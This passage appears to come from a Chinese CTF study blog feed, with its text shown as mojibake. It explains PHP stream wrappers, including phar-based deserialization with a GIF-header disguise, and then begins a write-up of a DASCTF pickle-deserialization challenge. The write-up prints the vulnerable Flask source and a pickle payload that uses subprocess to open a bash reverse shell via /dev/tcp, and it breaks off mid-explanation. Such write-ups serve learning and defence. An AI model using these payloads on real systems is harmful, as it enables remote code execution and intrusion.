    <content type="html"><![CDATA[<p>ä»‹ç»phpå¸¸è§çš„ä¼ªåè®®</p><h1 id="php-åè®®æ—"><a href="#php-åè®®æ—" class="headerlink" title="php:&#x2F;&#x2F; åè®®æ—"></a>php:&#x2F;&#x2F; åè®®æ—</h1><p>è¿™äº›åè®®ç”¨äºè®¿é—® PHP çš„è¾“å…¥&#x2F;è¾“å‡ºæµã€å†…å­˜ã€ä¸´æ—¶æ–‡ä»¶ç­‰èµ„æº</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>ç”¨é€”</strong>ï¼šè¯»å–åŸå§‹çš„ HTTP è¯·æ±‚ä½“æ•°æ®ï¼ˆå¦‚ POST,GET æ•°æ®ï¼‰</p><p><strong>å®ä¾‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>ç”¨é€”</strong>ï¼šåœ¨è¯»å†™æ–‡ä»¶æ—¶åº”ç”¨è¿‡æ»¤å™¨ï¼ˆå¦‚ç¼–ç &#x2F;åŠ å¯†ï¼‰ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>php://filter/&lt;è¿‡æ»¤å™¨é“¾&gt;/resource=&lt;æ–‡ä»¶è·¯å¾„&gt;</code></p><p>å®˜æ–¹æ–‡æ¡£ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åç§° æè¿°<br><span class="hljs-attribute">resource</span>=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;     è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚<br><span class="hljs-attribute">read</span>=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;         è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br><span class="hljs-attribute">write</span>=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;    è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;        ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å™¨ï¼š"><a href="#è¿‡æ»¤å™¨ï¼š" class="headerlink" title="è¿‡æ»¤å™¨ï¼š"></a>è¿‡æ»¤å™¨ï¼š</h3><h3 id="è½¬æ¢è¿‡æ»¤å™¨ï¼š"><a href="#è½¬æ¢è¿‡æ»¤å™¨ï¼š" class="headerlink" title="è½¬æ¢è¿‡æ»¤å™¨ï¼š"></a>è½¬æ¢è¿‡æ»¤å™¨ï¼š</h3><h4 id="convert-base64-encode-å’Œ-convert-base64-decode"><a href="#convert-base64-encode-å’Œ-convert-base64-decode" class="headerlink" title="convert.base64-encode å’Œ convert.base64-decode"></a>convert.base64-encode å’Œ convert.base64-decode</h4><p>å°†è¯»å–çš„æ•°æ®è¿›è¡Œbase64è½¬æ¢åè¾“å‡º</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-å’Œ-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-å’Œ-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode å’Œ convert.quoted-printable-decode"></a>convert.quoted-printable-encode å’Œ convert.quoted-printable-decode</h4><p>å°†éasciiç çš„å€¼è½¬æ¢ä¸ºè½¬æ¢ä¸º <code>=XX</code> æ ¼å¼çš„ ASCII å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>XX</code> æ˜¯è¯¥å­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ã€‚</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, ä¸–ç•Œ! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D ä¸­æ–‡è¢«è½¬æ¢</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>ä¾èµ– <code>iconv</code> æ‰©å±•ï¼Œéœ€ç¡®ä¿ PHP å·²å¯ç”¨è¯¥æ‰©å±•</p></blockquote><p><code>convert.iconv.*</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æµè¿‡æ»¤å™¨ï¼ˆStream Filterï¼‰ï¼Œç”¨äºåœ¨ä¸åŒå­—ç¬¦ç¼–ç ä¹‹é—´è¿›è¡Œè½¬æ¢</p><p><strong>è¿‡æ»¤å™¨æ ¼å¼</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.iconv.&lt;è¾“å…¥ç¼–ç &gt;.&lt;è¾“å‡ºç¼–ç &gt;<br>æˆ–<br>convert.iconv.&lt;è¾“å‡ºç¼–ç &gt;/&lt;è¾“å…¥ç¼–ç &gt;<br></code></pre></td></tr></table></figure><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å°† UTF-8 å­—ç¬¦ä¸²å†™å…¥ä¸º GBK æ–‡ä»¶</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;ä½ å¥½ï¼Œä¸–ç•Œï¼&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="é“¾å¼è¿‡æ»¤å™¨"><a href="#é“¾å¼è¿‡æ»¤å™¨" class="headerlink" title="é“¾å¼è¿‡æ»¤å™¨"></a><strong>é“¾å¼è¿‡æ»¤å™¨</strong></h3><p>ä¸åŒçš„è¿‡æ»¤å™¨å¯ä»¥ç”¨ç®¡é“ç¬¦è¿æ¥åšä¸€ä¸ªé“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å…ˆè§£ç  Base64ï¼Œå†è½¬æ¢ç¼–ç ï¼ˆå‡è®¾åŸå§‹æ•°æ®æ˜¯ GBK ç¼–ç çš„ Base64ï¼‰</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šè¯»å– ZIP å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>zip://&lt;å‹ç¼©åŒ…è·¯å¾„&gt;#&lt;å†…éƒ¨æ–‡ä»¶&gt;</code>ã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>ä»‹ç»</strong>ï¼šæ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p>allow_url_fopenå’Œallow_url_includeéƒ½éœ€è¦å¼€å¯ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>data:[&lt;MIMEç±»å‹&gt;][;base64],&lt;æ•°æ®&gt;</code>ã€‚</p><ul><li><strong>MIME ç±»å‹</strong>ï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ•°æ®çš„æ ¼å¼ï¼ˆå¦‚ <code>text/plain</code>, <code>image/png</code>ï¼‰ï¼Œé»˜è®¤æ˜¯ <code>text/plain</code>ã€‚</li><li><strong>base64</strong>ï¼ˆå¯é€‰æ ‡è®°ï¼‰ï¼šè¡¨ç¤ºæ•°æ®æ˜¯ Base64 ç¼–ç çš„ã€‚</li><li><strong>æ•°æ®</strong>ï¼šåŸå§‹å†…å®¹æˆ– Base64 ç¼–ç åçš„å†…å®¹ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// è¾“å‡º &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šè®¿é—® PHARï¼ˆPHP å½’æ¡£ï¼‰æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>phar://&lt;è·¯å¾„&gt;/file.phar/&lt;å†…éƒ¨æ–‡ä»¶&gt;</code>ã€‚</p><p><strong>ç”¨æ³•</strong>ï¼šåœ¨ååºåˆ—åŒ–å¯ä»¥ç”¨</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="æ¥è‡ªCSDNå—å—"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åˆ›å»ºå¹¶é…ç½® PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨pharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#pharåè®®ï¼Œphar.pharåŒ…ï¼Œ</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#å—å½±å“çš„file_existså‡½æ•° è§¦å‘ååºåˆ—åŒ–</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šåŒ¹é…æ–‡ä»¶è·¯å¾„æ¨¡å¼ï¼ˆå¦‚éå†ç›®å½•ï¼‰ã€‚ä¸€èˆ¬é…åˆåŸç”Ÿç±»ä½¿ç”¨</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/tuyi/2025/01/23/2025-1-23/"/>
    <url>/tuyi/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-DASCTF-const-python"><a href="#2024-DASCTF-const-python" class="headerlink" title="2024 DASCTF const_python"></a>2024 DASCTF const_python</h1><p>æç¤ºè®¿é—®&#x2F;srcæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;buu.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>åœ¨ppickleeè·¯ç”±ä¸­å­˜åœ¨<code>pickle.loads(pickle_data)</code>å°±å­˜åœ¨pickleååºåˆ—åŒ–</p><p>è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯subprocessæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨</p><p>payload1åå¼¹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;csubprocess</span><br><span class="hljs-string">    run</span><br><span class="hljs-string">    p0</span><br><span class="hljs-string">    ((lp1</span><br><span class="hljs-string">    Vbash</span><br><span class="hljs-string">    p2</span><br><span class="hljs-string">    aV-c</span><br><span class="hljs-string">    p3</span><br><span class="hljs-string">    aVbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="hljs-string">    p4</span><br><span class="hljs-string">    atp5</span><br><span class="hljs-string">    Rp6.</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">csubprocess\nrunï¼š<br><br>cï¼šè¡¨ç¤ºåŠ è½½æ¨¡å—ã€‚<br>subprocessï¼šå¯¼å…¥ Python æ ‡å‡†åº“ä¸­çš„ subprocess æ¨¡å—ã€‚<br>runï¼šå¼•ç”¨ subprocess.run æ–¹æ³•ã€‚<br>p0 åˆ° p6ï¼š<br><br>p0, p1, p2 ç­‰æ˜¯ pickle çš„å¼•ç”¨æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºåºåˆ—åŒ–å¯¹è±¡çš„å†…éƒ¨æŒ‡é’ˆã€‚<br>((lp1ï¼š<br><br>åˆ›å»ºä¸€ä¸ªåˆ—è¡¨å¯¹è±¡å¹¶å¼€å§‹å¡«å……æ•°æ®ã€‚<br>Vbash\np2ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸² <span class="hljs-string">&quot;bash&quot;</span> å¹¶ä¿å­˜åˆ° p2ã€‚<br><br>V-c\np3ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸² <span class="hljs-string">&quot;-c&quot;</span> å¹¶ä¿å­˜åˆ° p3ã€‚<br><br>Vbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\np4ï¼š<br><br>åºåˆ—åŒ–çš„åå‘ shell å‘½ä»¤ï¼ŒæŒ‡å‘ /dev/tcp/ip/portã€‚<br>bash -iï¼šäº¤äº’å¼å¯åŠ¨ Bashã€‚<br>&gt;&amp; /dev/tcp/ip/portï¼šå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æŒ‡å®šçš„ IP 